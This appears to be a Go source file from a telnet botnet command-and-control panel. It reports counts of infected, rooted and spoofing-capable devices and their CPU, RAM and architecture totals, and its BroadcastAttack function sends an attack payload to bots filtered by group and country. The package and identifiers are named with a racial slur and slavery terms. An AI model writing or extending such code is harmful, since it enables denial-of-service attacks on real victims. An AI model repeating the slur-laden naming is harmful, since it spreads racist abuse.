package niggers

import (
	slavev2 "advanced-telnet-cnc/source/niggers/v2"
)

var (
	FakeCounting = false
)

func Count() int {
	return slavev2.Slave.TotalCount()
}

func RootedCount() int {
	return slavev2.Slave.RootedCount()
}

func SpoofedCount() int {
	return slavev2.Slave.SpoofedCount()
}

func Distribution() map[string]int {
	return slavev2.Slave.Distribution()
}

func Arches() map[string]int {
	return slavev2.Slave.Arches()
}

func Versions() map[string]int {
	return slavev2.Slave.Versions()
}

func TotalSpeed() string {
	return slavev2.Slave.TotalSpeed()
}

func TotalRAM() int64 {
	return slavev2.Slave.TotalRAM()
}

func TotalCores() int64 {
	return slavev2.Slave.TotalCores()
}

func BroadcastAttack(payload []byte, group string, country string, devices int) int {
	slavev2.Slave.Broadcast(payload, group, country, devices)
	return slavev2.Slave.CountMatching(group, country, devices)
}
